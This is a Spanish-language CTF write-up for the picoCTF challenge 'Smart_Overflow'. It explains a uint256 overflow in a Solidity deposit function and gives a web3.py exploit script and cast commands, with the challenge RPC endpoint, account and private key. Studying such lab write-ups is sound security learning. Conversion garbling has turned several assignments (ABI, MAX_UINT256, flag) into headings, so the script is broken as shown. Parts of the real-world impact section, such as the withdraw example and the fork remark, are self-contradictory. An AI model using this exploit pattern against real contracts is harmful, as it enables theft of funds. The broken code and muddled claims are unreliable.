# Writeup: Smart_Overflow
**Categoría:** Medium
**Fecha de conversión:** 2026-05-04

---

Vulnerabilidad: Overflow en uint256


El tipo uint256 puede almacenar valores de 0 a 2^256 - 1 (aproximadamente 1.1579e77). Si sumamos dos números y el resultado supera 2^256 - 1, se produce un desbordamiento y el resultado se convierte en (a + b) % 2^256.


En este contrato, la línea balances[msg.sender] = balances[msg.sender] + amount; no tiene protección contra overflow. Por lo tanto, podemos provocar que el nuevo saldo sea menor que la cantidad depositada.

Estrategia de explotación


```
    Primero, llevar nuestro saldo al máximo posible: Depositamos 2^256 - 1. Esto hará que balances[msg.sender] = 2^256 - 1.

    Luego, depositamos 1: Al sumar (2^256 - 1) + 1 = 2^256, el resultado se desborda a 0 (porque 2^256 mod 2^256 = 0).

    Comprobación: balances[msg.sender] ahora es 0, y amount es 1. La condición balances[msg.sender] < amount es 0 < 1 → verdadera. Además, revealed es false en ese momento (a menos que ya se haya revelado antes). Por tanto, se ejecuta el bloque: revealed = true y se emite el evento FlagRevealed(flag).

    Obtenemos la flag: Podemos llamar a getFlag() o escuchar el evento.

```

Implementación práctica


El CTF nos proporciona:


```
    Un nodo RPC (Ethereum) con una red de pruebas (Chain ID 31337, típico de redes locales o de CTF).

    Una dirección de contrato desplegado (Bank Address).

    Una cuenta de usuario con 5 ETH para pagar el gas.

    Clave privada de esa cuenta.

```

Herramientas utilizadas


```
    Python 3 con la librería web3.py.

    Conexión HTTP al nodo RPC.

```

Script de explotación (comentado)

python


from web3 import Web3


```bash
# Datos de conexión (cambiaron durante el CTF, pero al final fueron estos)
```

RPC_URL = "http://mysterious-sea.picoctf.net:56322"

CONTRACT_ADDRESS = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"

MY_ADDRESS = "0x0E9Ad38AD07b2b3C384fbe19EBf570041D3B60FE"

PRIVATE_KEY = "0x39991cd9a64c18a19f7495427f3792f7f3d477ad909c086961026e81ae49da21"


```bash
# ABI mínimo necesario para las funciones que usamos
```

## Abi = '''[

```
    {
        "inputs": [{"internalType": "uint256","name": "amount","type": "uint256"}],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string","name": "","type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }
```

]'''


```bash
# Conectar al nodo
```

w3 = Web3(Web3.HTTPProvider(RPC_URL))

assert w3.is_connected(), "No se pudo conectar al nodo"

print(f"Conectado. Chain ID: {w3.eth.chain_id}")

print(f"Saldo inicial: {w3.from_wei(w3.eth.get_balance(MY_ADDRESS), 'ether')} ETH")


```bash
# Instanciar el contrato
```

contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)


```bash
# Número máximo que cabe en uint256
```

## Max_uint256 = 2**256 - 1


def send_tx(func, *args):

```
    """Envía una transacción al contrato y espera confirmación"""
    nonce = w3.eth.get_transaction_count(MY_ADDRESS)
    tx = func(*args).build_transaction({
        'from': MY_ADDRESS,
        'nonce': nonce,
        'gas': 200000,
        'gasPrice': w3.to_wei(1, 'gwei')  # precio bajo de gas para ahorrar
    })
    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"  Tx enviada: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    print(f"  Confirmada en bloque {receipt.blockNumber}")
    return receipt

```

```bash
# Paso 1: Depositar el máximo para llenar el saldo
```

print("\nPaso 1: Depositar MAX_UINT256...")

send_tx(contract.functions.deposit, MAX_UINT256)


```bash
# Paso 2: Depositar 1 para causar overflow y revelar la flag
```

print("\nPaso 2: Depositar 1...")

send_tx(contract.functions.deposit, 1)


```bash
# Paso 3: Leer la flag
```

print("\nPaso 3: Obtener la flag...")

### flag = contract.functions.getFlag().call()

print(f"\n=== **FLAG**: {flag} ===")


### Explicación línea por línea


```
    Conexión: Usamos Web3.HTTPProvider con la URL del nodo. La red es privada (Chain ID 31337).

    Saldo: Verificamos que tengamos fondos (5 ETH) para pagar el gas. Las transacciones cuestan muy poco (~0.0003 ETH cada una con gas a 1 Gwei).

    MAX_UINT256: 2**256 - 1 es el valor máximo. Se pasa como uint256 a la función deposit.

    Envío de transacciones: build_transaction prepara la transacción, la firmamos con nuestra clave privada, la enviamos y esperamos el recibo. El nonce se obtiene automáticamente para evitar conflictos.

    Después de la segunda transacción, la flag ya está disponible. La obtenemos con call() a getFlag().

```

Resultado


Al ejecutar el script, se obtiene:

text


Conectado. Chain ID: 31337

Saldo de tu cuenta: 5 ETH


Paso 1: Depositar MAX_UINT256...

```
  Tx enviada: 0x6ad67fbd2e0f819cf711a7e2dde73145057d8576bb4d4c57644f094eebc185fe
  Confirmada en bloque 4

```

Paso 2: Depositar 1...

```
  Tx enviada: 0xb36c13a28e45daf1e262995e58407a7cacc70dd73fcf56f1e31811d8e6298225
  Confirmada en bloque 5

```

Paso 3: Obtener la flag...


=== **FLAG**: picoCTF{******************************} ===


Lecciones aprendidas


```
    Versiones de Solidity importan: A partir de Solidity 0.8.0, los overflows son detectados y la transacción revierte a menos que se use unchecked. En versiones anteriores, hay que usar librerías como SafeMath.

    Validación de entradas: Si el contrato hubiera comprobado que amount <= max - balance, se habría prevenido el overflow.

    Eventos como fuente de información: La flag se emite en un evento, pero también se puede leer con una función view.

    Interacción con redes de CTF: Herramientas como web3.py o cast son esenciales para enviar transacciones programadas.

```

Alternativa con cast (Foundry)


Si se prefiere usar la terminal:

bash


RPC="http://mysterious-sea.picoctf.net:56322"

CONTRACT=0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9

PK=0x39991cd9a64c18a19f7495427f3792f7f3d477ad909c086961026e81ae49da21

FROM=0x0E9Ad38AD07b2b3C384fbe19EBf570041D3B60FE


cast send $CONTRACT "deposit(uint256)" 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff --rpc-url $RPC --private-key $PK --from $FROM

cast send $CONTRACT "deposit(uint256)" 1 --rpc-url $RPC --private-key $PK --from $FROM

cast call $CONTRACT "getFlag()" --rpc-url $RPC


El resultado es el mismo.


Con esto queda explicado el por qué (vulnerabilidad de overflow en Solidity <0.8.0) y el cómo (depósito masivo seguido de un pequeño depósito para provocar el desbordamiento).



Repercusión práctica de la vulnerabilidad de desbordamiento (overflow) en contratos inteligentes


En el CTF, el overflow solo sirve para obtener una bandera, pero en el mundo real las consecuencias pueden ser catastróficas económicamente. No es como un XSS (que afecta a sesiones web), sino un error de lógica aritmética que puede permitir a un atacante robar fondos, crear tokens de la nada, o romper la integridad del contrato.

¿Qué puede hacer un atacante con un overflow?


```
    Robar tokens o Ether
    Si el saldo se desborda hacia un valor pequeño (como vimos), el atacante podría luego retirar más de lo que realmente tiene. Por ejemplo, tras el overflow a 0, podría llamar a withdraw con una cantidad enorme porque balances[msg.sender] >= amount sería falso (0 no es mayor que nada). Pero en otros contratos mal diseñados, un overflow en una resta podría permitir retirar fondos sin tener saldo suficiente.

    Acuñación infinita de tokens
    El caso más famoso es el BatchOverflow (2018). Contratos ERC-20 como BeautyChain (BEC) tenían una función batchTransfer que sumaba cantidades sin verificar overflow. Un atacante podía enviar tokens a muchas direcciones con un amount enorme y un cnt pequeño, de forma que amount * cnt se desbordaba a un número pequeño. El contrato entonces transfería una cantidad enorme (debido al desbordamiento) desde el saldo del atacante, pero al ser el resultado pequeño, el atacante solo pagaba una fracción. Esto generó una acuñación masiva de tokens, hundiendo su valor.

    Bypass de validaciones
    Un overflow puede convertir un número grande en uno pequeño, eludiendo comprobaciones como require(balance >= amount). En el ejemplo del CTF, la condición que revela la flag es justamente nuevo_saldo < amount, pero en otros contextos un if (balance + amount > limite) podría fallar si la suma se desborda y da un valor bajo.

    Congelamiento de fondos o denegación de servicio
    Si un overflow lleva a un estado inesperado (por ejemplo, un mapeo de balances corrupto), el contrato podría quedar inutilizable.
```

Opciones reales para un atacante


```
    Sin pagar: En muchos casos, el atacante sí paga gas (como en el CTF), pero el costo del gas es mínimo comparado con el beneficio (robar millones de dólares en tokens). No es "gratis", pero el beneficio neto es enorme.

    Consecuencias: La explotación puede llevar a:

        Pérdida total de fondos para los usuarios.

        Colapso del valor del token (si se acuña masivamente).

        Demandas, pérdida de reputación y abandono del proyecto.

```

Ejemplos históricos reales


```
    BeautyChain (BEC): El atacante creó una cantidad ingente de tokens y los vendió, causando una caída de precio del 100% en ese exchange. La blockchain de Ethereum tuvo que realizar una bifurcación (no, fue un problema del contrato, no de Ethereum). El valor en juego superó los 900 millones de dólares en capitalización de mercado.

    EDU Token: Un overflow similar permitió acuñar 36 millones de tokens.

    SMT (SmartMesh): También afectado, se perdieron millones.

```

Prevención en la práctica


```
    Usar Solidity >=0.8.0 (detecta overflows automáticamente).

    Usar bibliotecas como OpenZeppelin SafeMath si se trabaja con versiones anteriores.

    Auditorías de código y pruebas exhaustivas (incluyendo fuzzing).

    No confiar en que los desbordamientos "nunca ocurrirán".
```

